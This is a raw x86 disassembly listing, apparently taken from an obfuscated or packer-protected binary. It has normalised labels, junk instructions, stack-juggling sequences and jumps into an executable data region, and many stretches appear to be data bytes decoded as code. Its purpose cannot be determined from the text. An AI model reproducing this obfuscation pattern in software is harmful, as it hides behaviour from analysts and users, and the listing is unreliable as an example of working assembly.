lea esp [ esp + 0x24 ]
jne rwxdata
jmp rwxdata
jne rwxdata
pushad
call sub_1020a43d
pushad
inc esi
pushad
inc edi
push esi
push edi
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp sub_101d8396
push edx
lea esp [ esp + 0x4 ]
jne rwxdata
push eax
push 0x56f38b65
jmp rwxdata
pushad
jmp rwxdata
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
inc esi
push edx
mov [ esp ] 0x7421
inc edi
mov [ esp + 0xc ] bh
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp sub_101d8396
sub_101e4867
lea esp [ esp + 0x28 ]
ja rwxdata
rcr ch 0x3
test sp 0x654e
mov ecx [ esi + 0x4 ]
push edi
mov [ esp ] dx
or ecx ecx
call sub_101bc663
sbb [ 0xffffffffa35e412a ] dh
sbb ebp [ esi + esi * 2 ]
imul ebp [ ebp + 0x64e41d6e ] 0xb42a6857
cmp eax 0xe6b867c8
mov eax 0xa897bcc2
push esi
dec ecx
lds ebx [ ecx - 0xf ]
lodsd [ esi ]
or ebp esi
xor [ cs : ecx ] ebx
inc esi
push edi
xchg esp eax
stosb [ edi ]
mov ebx 0x820e9d61
mov [ 0xffffffffacb3b5ec ] eax
in eax dx
int1
fistp [ esi + esi * 8 ]
inc eax
arpl [ edx + 0x4c ] si
pop ebp
salc
outsd
iretd
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_10209fc0
test cx di
cmp [ edi - 0x1 ] 0x0
push 0xf631bd42
lea esp [ esp + 0x8 ]
jne rwxdata
push eax
mov [ esp ] eax
call sub_101d12b7
mov edi esi
btc di 0xc
inc edi
rcr edi cl
mov edi [ edx + 0x24 ]
clc
call sub_101151da
push edi
sbb eax 0x95a11e81
jmp 0xffffffffd19d90ee
sub_1020a28e
push [ esp + 0x4 ]
lea esp [ esp + 0x28 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
mov [ edi - 0x1 ] 0x0
not al
push ebx
pushad
push [ esp ]
cwde
lea eax [ rwxdata ]
pushfd
mov [ esp + 0x24 ] rwxdata
mov [ esp + 0x20 ] 0x46
mov [ esp + 0xc ] 0x1d01
mov [ esp + 0x20 ] eax
pushfd
mov [ esp + 0x4 ] dh
push 0xf37a143
push [ esp + 0x28 ]
retn 0x2c
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_1020a42e
push edi
push [ esp + 0x8 ]
jmp rwxdata
lea esp [ esp + 0x10 ]
je rwxdata
and bx si
bswap bx
jmp sub_101d6177
pushad
cmp ebx 0x3
jmp rwxdata
pushad
jmp rwxdata
lea esp [ esp + 0x40 ]
je rwxdata
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
mov [ esp ] ah
pushfd
lea esp [ esp + 0x8 ]
jmp sub_101d8368
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_1020a442
or ecx ecx
push esi
call sub_101d2ff5
inc esp
xor [ esi + 0xc ] ch
jb rwxdata
and esi [ ebx ]
or al 0xf9
inc ebp
jge rwxdata
bound esi [ ebx - 0x1a ]
xchg ebx eax
mov dh 0x75
shr [ ebp - 0x68 ] cl
sti
pop ebx
and edx [ esi - 0x4f7807b8 ]
scasd [ edi ]
push ss
test al 0xb1
lodsd [ esi ]
cmp [ esi - 0x73ac4898 ] eax
popfd
jno rwxdata
in al dx

nop
retn
je rwxdata
pushad
das
0x74ff576b 0x824
jmp rwxdata
salc
call 0x54fb94cd
out dx eax
jo rwxdata
ficomp [ ebx ]
retn
lea esp [ esp + 0x10 ]
je rwxdata
and bx si
bswap bx
jmp sub_101d6177
pushad
cmp ebx 0x3
jmp rwxdata
pushad
jmp rwxdata
lea esp [ esp + 0x40 ]
je rwxdata
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
mov [ esp ] ah
pushfd
lea esp [ esp + 0x8 ]
jmp sub_101d8368
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_1020b2b6
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
pushfd
sbb si 0x4058
shld si ax 0x7
cmp cl al
mov ecx edi
bswap esi
bt di bp
sub ecx ebx
cmc
xor si 0xec47
bt ebp ecx
lea esi [ esp + 0x4 ]
bt esi 0x12
test bp di
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub edi 0x4
mov [ esp ] 0xe1
pushad
mov [ esp ] bh
push [ edi ]
pop [ esp + 0x20 ]
cmc
cmp edi ebx
mov [ esp ] 0x793d
pushfd
lea esp [ esp + 0x24 ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
inc al
sar al 0x7
inc al
not al
sub ebx edi
lea edi [ eax * 8 - 0x3f0dcc2b ]
inc di
sete al
add ebx esp
add edi edi
rol edi cl
btr di 0x9
sub al 0xd2
mov edi ebx
rol al 0x3
rol al 0x1
rcr al 0x5
rol al cl
mov al 0x2e
cmp cl 0x58
pushad
stc
jmp rwxdata
pushfd
call sub_101be1d9
[ edi ]
pushfd
call sub_101bfa09
push edx
shrd ax cx cl
aam 0xb3
sub ax bp
mov eax [ ebp + 0x8 ]
call sub_101d1613
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_101d968a
call sub_101d2d5a
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_1020b43b
mov [ esp ] 0xa4aad93
lea esp [ esp + 0xc ]
jb rwxdata
cmp ax 0x4037
stc
pushfd
or al al
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
pushad
cmp ah 0xe6
lea esp [ esp + 0x20 ]
js rwxdata
push 0xc5f88448
mov [ esp ] 0xed25
test sp 0x9ab3
bt di 0x4
or ah ah
jmp j_sub_101bc751
jmp rwxdata
cmp ch al
cmc
cmp ah 0x5a
call sub_101e472a
push eax
imul edx [ esi + 0x69 ] 0x8746d836
sbb ebp 0x702f127a
fmul [ edx ]
sti
pxor mm7 [ edi - 0x60 ]
pop edi
loopne rwxdata
cmp ah 0x5a
pushfd
lea esp [ esp + 0x4 ]
jle rwxdata
test cx dx
pushad
test bl 0x6
cmp al ah
mov [ esp + 0x1c ] bl
lea esp [ esp + 0x20 ]
jg rwxdata
loope rwxdata
int3
call sub_101bb48b
mov edi eax
jmp rwxdata
push eax
lea esp [ esp + 0x4 ]
ja rwxdata
jmp rwxdata
jne rwxdata
sub al 0x9
adc eax 0xd0bfbf56
int3
add esp [ 0xffffffff85da2a19 ]
xchg esi eax
or [ eax + eax * 8 + 0x4f ] ecx
nop
ror [ eax - 0x29 ] cl
inc edi
0x2471ae84 0x409a
lahf
and eax 0xdc0d91e0
add bh [ ebx + 0x3 ]
mov ecx 0x104
mov [ esp + 0x4 ] 0xf3
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
push 0xd4c6fbc9
add ah 0x20
sub esp 0xfffffffc
push edx
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
call sub_1020a43d
push eax
push 0x56f38b65
jmp rwxdata
jns rwxdata
push ecx
cmp si ax
clc
xor al al
jmp sub_101d03b0
pushad
jmp rwxdata
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
jle rwxdata
xchg ecx eax
or eax 0x37b02dc
imul edi [ ebp + 0x6eb6fec1 ] 0x123d0ba4
or al 0xb6
or [ 0x1586f8c1 ] bl
fld [ edx + 0x471bdaa4 ]
shl bl 0x1
mov al 0x6f
mov al 0x50
out dx al
inc esp
cli
jmp rwxdata
dec esp
jo rwxdata
inc esi
push edx
mov [ esp ] 0x7421
inc edi
mov [ esp + 0xc ] bh
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp sub_101d8396
push es
test [ ebx - 0x315665e1 ] edx
push ebp
mov [ 0xffffffff9b8a55c5 ] al
fadd [ esi + 0x404f1d2f ]
aaa
jae rwxdata
mov edx 0xf649c678
cmp esi esp
dec esp
inc [ esi ]
pop ebx
mov edi 0x32d33120
inc ebx
xchg ebx eax
jpo rwxdata
mov eax 0xe910689
pushfd
pushad
mov [ esp + 0x1c ] 0xffeaca97
call sub_101d6995
pop ebp
sbb [ ebx ] ecx
mov ah 0x72
or al 0x4d
xlat
movsb [ edi ] [ esi ]
and [ ebx ] 0x3e
in eax 0x59
lodsd [ esi ]
adc ch [ ebp - 0x56e976ca ]
imul edx esi 0x104ec737
jpe rwxdata
push 0xffffffec
jb rwxdata
outsb
movsb [ edi ] [ esi ]
or edi [ 0x8b60c12 ]
sbb eax 0x1586f8c1
leave
test eax 0x38a1d39a
arpl [ eax - 0x7d ] sp
out 0x78 al
jbe rwxdata
dec ebp
jno rwxdata
cmp [ edx ] ebp
xchg ebp eax
pop ss
inc eax
0xd89a
jno rwxdata
mov ah 0x96
enter 0xc817 0x2a
stosd [ edi ]
xlat
pushfd
push ebp
or [ edx ] edi
adc esp ecx
push edi
xchg ecx eax
push es
mov ecx 0xece1a03f
sbb [ ebp + 0x7f ] ebp
or edx [ 0xffffffffdec01f82 ]
xor al [ ebx - 0x6d ]
mov edx 0x4b73436c
push ebx
dec ebx
mov [ eax - 0x1a ] ds
cdq
pushfd
0x3aa433a0 0x32ac
mov edi 0x63629b46
adc eax 0xdec01f82
sub_1020c122
lea esp [ esp + 0x4 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
cmp bx cx
test bh 0xb8
call sub_101d153d
sub al 0x30
cmp bh ah
cmp al 0x9
pushfd
pushfd
lea esp [ esp + 0xc ]
jne rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call sub_101d8673
pop ebp
je rwxdata
pushad
lea esp [ esp + 0x20 ]
ja rwxdata
mov dh 0xd9
lds ebx [ edx + eax ]
xor ecx [ ebx ]
jmp eax
aas
mov edi 0xf38bab94
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
pushad
imul edx edx 0xa
jmp rwxdata
cmp al 0x0
add [ ebp + 0x74 ] bl

test eax 0xf0ef18a6
add [ ecx + esi ] eax
or eax 0x8c7362a3
jb rwxdata
add edx eax
pushfd
mov [ esp ] 0xfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
dec eax
pushfd
jno rwxdata
inc eax
mov bl 0xa0
shl [ edx + eax * 2 ] 0x2b
push ebx
xchg edi eax
test al 0x90
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
sub edi [ ebx + eax ]
pop ebx
insb
sub al 0xb2
aas
fwait
idiv [ eax ]
mov cl 0x6b
rcl ch cl
in al 0xfb
hlt
cdq
js rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
push esp
sub esp ebx
cmp edi [ ebx ]
jb rwxdata
stosd [ edi ]
mov esi ebx
push esp
sub ch [ eax + 0x11 ]
ficom [ eax + edi ]
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
lea esp [ esp + 0x8 ]
jne rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
setb al
lahf
mov [ edi - 0x1 ] 0x0
cwde
lea eax [ ecx - 0x6eda5b04 ]
bswap ax
push ebx
bswap ax
cwde
lea eax [ rwxdata ]
pushad
push ebx
pushad
mov [ esp + 0x4 ] 0x90407234
mov [ esp + 0x40 ] rwxdata
pushfd
mov [ esp ] cl
mov [ esp + 0x40 ] eax
pushfd
pushfd
mov [ esp ] 0xb957
push [ esp + 0x48 ]
retn 0x4c
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_1020c166
lea esp [ esp + 0x10 ]
je rwxdata
and bx si
bswap bx
jmp sub_101d6177
clc
cmp ah bl
cmp ebx 0x3
jmp rwxdata
je rwxdata
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
mov [ esp ] 0x8aed258b
mov [ esp ] di
lea esp [ esp + 0x4 ]
jmp sub_101d8368
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_1020c332
pushfd
add eax edi
cmc
cmp eax edx
lea esp [ esp + 0x8 ]
jpe rwxdata
call j_sub_101ca144
pushfd
lea esp [ esp + 0x4 ]
jb rwxdata
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
clc
call sub_101d2719
jpo rwxdata
jb rwxdata
scasb [ edi ]
or ch bh
in al 0xf9
push edx
not [ esi ]
dec esp
pop esp
cdq
fisub [ esi + 0x627c8764 ]
push ecx
or eax 0x4f13646e
cmpsd [ esi ] [ edi ]
sbb cl dl
or eax 0xe43a2996
mov [ ecx ] 0x431cf69e
js rwxdata
stc
in al dx
push edi
sbb [ ebx + 0x6f ] 0xffffff8a
push esp
pop ds
cmp ebx eax
mov al 0x7
inc ebx
push cs
0x281ff48e 0x98ad
xchg [ ebx ] dh
dec ebx
call 0x23e74859
jmp 0x7c99d60a
pop esp
0xe175e945 0x6c7d
jb rwxdata
iretd
shr ebp 0x1
jno rwxdata
mov dl 0x90
jno rwxdata
aad 0x35
stosb [ edi ]
shr [ ebx - 0x12a08f00 ] cl
adc al 0x7b
xor eax 0xfac5f46a
pushad
mov al [ 0xfffffffff83daf9e ]
mov edx 0xa8b70f39
bound ebx [ esi + esi * 2 + 0x5cd46be8 ]
test eax 0x11c1add1
mov ds [ edi + 0x7e54fce2 ]
and [ edx ] esi
xchg esp eax
inc ecx
jge rwxdata
outsd
scasd [ edi ]
fwait
fldcw [ edi + 0x20 ]
jle rwxdata
add [ ebx - 0x5609368a ] dh
aad 0xe9
cli
mov edi 0x5f36cf20
inc eax
push edx
mov al 0x19
in al dx
mov [ 0xffffffffaa09161c ] eax
je rwxdata
sub eax [ ebx - 0x24 ]
mov edi 0x599847c0
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
cwde
jpo rwxdata
jmp rwxdata
dec eax
pop ds
mov ebp 0xb115aa7a
aas
add eax 0xc5408d39
mov al [ 0x4a57a4fb ]
fldenv [ ebp + 0x76 ]
test [ esi + ebx + 0x2d ] dl
or [ edx ] ebx
and al 0x35
adc al 0xae
mov al [ 0x7a259d01 ]
sbb esp [ ebx - 0x52cd6b96 ]
inc edi
mov esi 0x136bcfb0
salc
or [ ecx ] bl
jno rwxdata
call esi
call 0xffffffff9373e256
pop ebx
outsd
mov dl [ edi + ebx + 0x3b ]
fdiv [ eax - 0x15f1bcf9 ]
xchg [ ebx - 0x2d ] ebp

mov bl 0x76
leave
imul [ ecx - 0x4005162b ]
and bh cl
pop edi
out dx al
sti
xchg esp eax
xor ch [ 0x3253e8f8 ]
add [ eax ] eax
sub_1020caea
push edx
add ecx 0x1
jmp rwxdata
call sub_101bb3cf
xchg esi eax
inc edi
cwde
lea edx [ ecx + 0x79 ]
movsd [ edi ] [ esi ]
mov dh 0xc6
cli
lds ecx [ ecx - 0x1 ]
inc ebp
cli
dec edi
scasd [ edi ]
xchg edi esi
in al 0x3b
pop ds
jg rwxdata
imul esi esp 0xffffffad
mov esp [ esi - 0x61 ]
and ebx [ ebx + 0x39cdf40 ]
jmp rwxdata
xor al 0x2
add eax [ edx + ebx - 0x29 ]
sub [ cs : edi ] dl
jpo rwxdata
sub dh ah
mov eax 0x65544a27
jno rwxdata
push eax
mov [ esp + 0x8 ] 0x16
push 0x72754fda
push [ esp + 0x30 ]
retn 0x3c
int1
sbb al 0xe2
ja rwxdata
lds ebx [ ecx ]
int 0xf2
inc eax
fild [ ebx - 0xc ]
lodsd [ esi ]
into
mov [ edi + 0xfa3dbe0 ] ebp
mov dh 0xe8
mov ebp [ esp + 0x4 ]
pushad
shl [ edx + ebp * 8 + 0x49 ] cl
push ss
daa
or esp [ edi - 0x59 ]
xchg [ eax + 0x44e4a3dc ] dh
sbb bh [ edx ]
jae rwxdata
into
fimul [ edx ]
popfd
xor [ ecx ] 0xb009aae3
adc [ edi + ecx * 2 - 0x70 ] 0x5b0302a1
pop ebp
and dh [ ebx ]
out 0xf8 eax
or [ ebx + 0x518e9682 ] eax
cmpsb [ esi ] [ edi ]
or [ edx - 0x6c8dce23 ] al
sti
sub [ esi + 0x3d29dcc7 ] esi
sub [ ebp + esi * 8 - 0x4b ] bh
imul edi [ edx - 0x6c ] 0x28642e71
mov gs dx
or eax 0x7fc46f96
mov edi [ ecx + 0x59 ]
jl rwxdata
out 0x20 al
aas
and [ ebx - 0x2fa0804a ] 0x4f
pushfd
sbb [ esi - 0x40 ] 0xffffffd1
0x8aa99633 0xc63f
sahf
nop
mov bh 0x12
sar [ esi + 0x3b ] cl
mov [ edx + 0x3ffc3eb9 ] edx
xchg edi eax
imul esi [ ecx ] 0x13f9a21e
into
xor [ edx + 0x6ca7ac53 ] dh
sub_1020cbcc
mov [ edi - 0x1 ] 0x0
pushfd
not ah
push [ esp + 0x8 ]
bswap ax
mov [ esp + 0xc ] ebx
pushad
pushfd
cwde
lea eax [ rwxdata ]
jmp rwxdata
pushfd
call sub_101c67a8
push esp
call sub_101c8658
sub_1020cbec
push ebp
lea esp [ esp + 0x8 ]
ja rwxdata
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
setpe bl
setns bl
inc ecx
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_1020cfff
lea esp [ esp + 0x48 ]
jne rwxdata
pushad
call sub_1020a43d
pushfd
inc esi
mov [ esp ] 0xf8
inc edi
push ecx
mov [ esp + 0x4 ] cx
pushfd
lea esp [ esp + 0xc ]
jmp sub_101d8396
sub_1020d18a
dec dl
shr dl 0x2
test ax bx
mov dl [ esi ]
stc
bt bp sp
call sub_101c8a62
add eax 0xf3ac136c
mov edx 0x1509a04b
stosb [ edi ]
loope rwxdata
mov eax [ 0x2e90268d ]
add edx esp
ja rwxdata
into
xor al [ eax ]
movsd [ edi ] [ esi ]
push eax
test al 0xec
aaa
pop es
scasd [ edi ]
dec edi
push ebx
insb
stosb [ edi ]
mov ah 0x5d
shl [ ecx - 0x52 ] 0x17
cmpsd [ esi ] [ edi ]
dec ebp
mov eax 0x142bfb64
retn
sbb ebp eax
jo rwxdata
pop edx
in eax 0x22
mov ebp 0x55290db1
inc eax
push ds
adc [ esi ] ecx
fadd [ esi ]
sti
retn
addps xmm0 [ edx + 0x73940ad5 ]
insb
fwait
inc esp
jle rwxdata
nop
add edx esp
sub_1020d330
push edx
mov [ esp + 0x24 ] rwxdata
mov [ esp ] ch
mov [ esp ] 0x7c
jmp rwxdata
call sub_101ca702
add [ eax ] al
inc ebx
jb rwxdata
sub al 0x93
or al 0x4a
popad
je rwxdata
sbb dl al
sbb eax 0x2b33f6c9
jbe rwxdata
int 0x76
mov ah 0x20
loopne rwxdata
adc al 0x46
pop eax
xchg ebx eax
mov [ esi + 0x41c28a79 ] fs
popfd
faddp st4
sbb ebp [ edi ]
pop ebx
add al 0x45
aad 0xa
dec edx
push eax
popad
insb
je rwxdata
loope rwxdata
jge rwxdata
lodsd [ esi ]
mov [ 0x5bb708db ] eax
or [ ebx - 0x2c ] esi
pop ss
inc edi
sub ebx eax
jl rwxdata
mov [ ebx + 0x407b7c20 ] dl
jns rwxdata
add [ gs : eax - 0x3f7b3701 ] al
pushad
mov [ esp ] bl
lea esp [ esp + 0x28 ]
je rwxdata
add edx [ ecx + edi ]
test [ edx - 0x736c8b2c ] al
hlt
mov bh 0x5b
dec edx
std
jpe rwxdata
dec ecx
pushad
or eax 0x2ef00f80
mov cl cl
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
test esp esi
sub al 0x30
clc
stc
cmp al 0x9
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
cmpsw [ esi ] [ edi ]
xchg edx eax
or al 0x27
sbb al 0x63
sbb edi ebp
ja rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
clc
pushfd
imul edx edx 0xa
stc
push esp
add edx eax
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
jo rwxdata
jae rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
mov dl 0x7d
mov [ 0xffffffff8ed086f9 ] al
cmp al 0xe2
loopne rwxdata
inc ebp
outsb
and al 0x7a
mov esi ecx
aaa
sbb dl [ edx - 0x72 ]
movsb [ edi ] [ esi ]
sbb edx esi
das
jle rwxdata
and ah [ ebx + 0x71 ]
pushad
xchg [ edi ] edi
mov edi 0x2f6feb74
xchg esp eax
dec ebx
xchg edx eax
or al 0xb3
in al dx
jg rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
or al 0x9a
cmc
fnstsw ax
fsub [ esi ]
xchg ebx eax
insd
cwde
in eax dx
add [ esi ] edi
pop esp
dec ebp
shr esi cl
push ss
jns rwxdata
sub esi esp
cmp esp ebx
adc [ ecx - 0xfcf24e3 ] esp
fist [ edi ]
0x49482b04 0xc7f0
0xdc82d7c7 0x70ed
sub dh [ edx + eax * 8 - 0x44 ]
jns rwxdata
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
mov eax 0xc6ef186
jb rwxdata
cmpsb [ esi ] [ edi ]
mov al 0x8f
mov al [ 0x6daf6e31 ]
jb rwxdata
mov cl 0xe
pop ds

adc [ esi + 0x65 ] edx
loope rwxdata
in al dx
xor bl bl
and eax esi
sbb [ edx ] dh
sub eax 0x46596955
pop eax
daa

pop ebx
sbb [ ebx + 0xb ] esi
pop edi
rcr [ ebp + 0x42 ] 0x3e
insb
sub al 0x75
test [ eax - 0x1969da24 ] 0x7
das
hlt
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
cmpsd [ esi ] [ edi ]
aaa
cld
inc edi
aam 0x2a
mov edi 0xa08b301f
or dh ah
dec eax
mov dh [ eax + 0x203824e1 ]
pop ebx
int1
pop ebx
mov cl 0xf7
and al 0xd4
inc ebp
std
fisttp [ ebp - 0x79 ]
cmp [ ecx - 0x6c ] cl
pushfd

fmulp st5
adc eax 0xd042fbf0
iretd
mul [ esp + edx * 8 ]
jo rwxdata
stc
imul edx edx 0xa
jmp rwxdata
ror bh 0x1
and edi [ edi - 0x63 ]
test [ ecx ] dh
push ecx
xchg ebp eax
mov [ edx ] edx
insd
retn 0x695d
in al dx
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
